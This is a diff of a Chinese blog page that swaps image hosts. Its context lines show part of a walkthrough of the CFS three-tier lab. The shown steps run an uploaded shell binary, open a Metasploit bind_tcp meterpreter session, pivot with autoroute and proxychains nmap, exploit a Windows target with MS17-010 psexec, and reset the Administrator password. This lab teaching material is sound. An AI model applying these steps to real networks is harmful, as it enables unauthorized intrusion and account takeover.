-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS37.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>2、利用蚁剑将shell2.elf上传到Target2并开启监听</p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS37.png"><br>2、利用蚁剑将shell2.elf上传到Target2并开启监听</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>www:/www/wwwroot/upload<span class="token punctuation">)</span> $ <span class="token function">chmod</span> <span class="token number">777</span> shell2.elf
 <span class="token punctuation">(</span>www:/www/wwwroot/upload<span class="token punctuation">)</span> $ ./shell2.elf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS38.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS38.png"></p>
 <p>3、在MSF中开启EXP，与Target2建立连接，这里需要注意，上一次代理使用的reverse_tcp是MSF作为监听，让Target1连到我们，而这次代理使用的bind_tcp是Target2作为监听，我们需要连到Target2，这个逻辑正好是相反的。</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf5 <span class="token operator">></span> use exploit/multi/handler
 msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> payload linux/x64/meterpreter/bind_tcp
@@ -575,24 +575,24 @@ msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="to
 msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LPORT <span class="token number">4321</span>
 msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> options
 msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS39.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>4、与之前一样，我们添加Target3的路由，这里就不用设置代理了，直接添加路由即可</p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS39.png"><br>4、与之前一样，我们添加Target3的路由，这里就不用设置代理了，直接添加路由即可</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run autoroute -s <span class="token number">192.168</span>.33.0/24
 run autoroute -p<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS40.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>5、尝试扫描Target3</p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS40.png"><br>5、尝试扫描Target3</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~<span class="token comment"># proxychains4 nmap -Pn -sT 192.168.33.33</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS43.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS43.png"></p>
 <h1 id="0x03-Target3"><a href="#0x03-Target3" class="headerlink" title="0x03 Target3"></a>0x03 Target3</h1><h2 id="a、获取shell-2"><a href="#a、获取shell-2" class="headerlink" title="a、获取shell"></a>a、获取shell</h2><p>1、从扫描的结果来看，不难看出这是一个开放着445、3389端口的Windows系统，那就先用永恒之蓝攻击试试</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf5 <span class="token operator">></span> use exploit/windows/smb/ms17_010_psexec
 msf5 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_psexec<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> payload windows/meterpreter/bind_tcp
 msf5 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_psexec<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> RHOST <span class="token number">192.168</span>.33.33
 msf5 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_psexec<span class="token punctuation">)</span> <span class="token operator">></span> options
 msf5 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_psexec<span class="token punctuation">)</span> <span class="token operator">></span> run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS44.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS44.png"></p>
 <p>2、查看账户，直接修改账户密码，利用3389连接，注意要在SocksCap中运行连接远程桌面程序</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">></span> shell
 C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system3<span class="token operator"><span class="token file-descriptor important">2</span>></span>net user
 C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system3<span class="token operator"><span class="token file-descriptor important">2</span>></span>net user Administrator <span class="token number">123</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS45.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS46.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS45.png"><br><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/CFS46.png"></p>
 <h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>到目前为止，三台靶机都已经拿下，这里推荐读者能够自己亲手尝试，找到里面的flag，其中所有flag的找寻方式，会在我的公众号“TeamsSix”推送，这里只讲述拿下三台靶机的方法。<br>这次的练习耗费了自己的大量时间，从靶场搭建到获取到第三层靶机的shell，这其中碰到的一些问题及我自己踩过的一些坑记录在下面：</p>
 <p>1、蚁剑中查看一些文件会提示权限不足，在meterpreter中可以正常查看<br>2、蚁剑中在Target2里执行命令或者查看文件时不时会失败，初步判断是因为本地网络代理的原因，多试几次就行，总有一次是成功的<br>3、MSF中Socks5代理模块使用总是失败，Socks4a模块使用成功<br>4、MSF中建立的会话总是自动断开，将会话连接的靶机上的防火墙关闭即可<br>5、MSF中ms17_010_eternalblue模块利用总是失败，ms17_010_psexec模块使用成功<br>6、meterpreter中查看文件的路径和Windows下文件的路径里的“/”是相反的<br>7、meterpreter中上传文件大小貌似有限制，文件上传到8M左右就会提示失败，因此需要将文件压缩成多个小文件进行上传，同时上传7-zip工具（该工具只有1M大小），再利用7-zip对其解压即可，当然此方法仅适用于Windows，linux上的方法可以自行谷歌</p>
 <blockquote>
@@ -601,7 +601,7 @@ C:<span class="token punctuation">\</span>Windows<span class="token punctuation"
 <blockquote>
 <p>本文首发地址：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/187908">https://www.anquanke.com/post/id/187908</a></p>
 </blockquote>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/TeamsSix_Subscription_Logo2.png"></p>
 
                 
             </div>
@@ -753,7 +753,7 @@ C:<span class="token punctuation">\</span>Windows<span class="token punctuation"
                 <a href="/191021-213828.html">
                     <div class="card-image">
                         
-                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag13.png" class="responsive-img" alt="【续】CFS三层靶机中的Flag位置及其获取">
+                        <img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/flag13.png" class="responsive-img" alt="【续】CFS三层靶机中的Flag位置及其获取">
                         
                         <span class="card-title">【续】CFS三层靶机中的Flag位置及其获取</span>
                     </div>
@@ -809,7 +809,7 @@ C:<span class="token punctuation">\</span>Windows<span class="token punctuation"
                 <a href="/191014-090745.html">
                     <div class="card-image">
                         
-                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/mianshi3.png" class="responsive-img" alt="经过一场面试，我发现我还存在这些不足">
+                        <img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/mianshi3.png" class="responsive-img" alt="经过一场面试，我发现我还存在这些不足">
                         
                         <span class="card-title">经过一场面试，我发现我还存在这些不足</span>
                     </div>
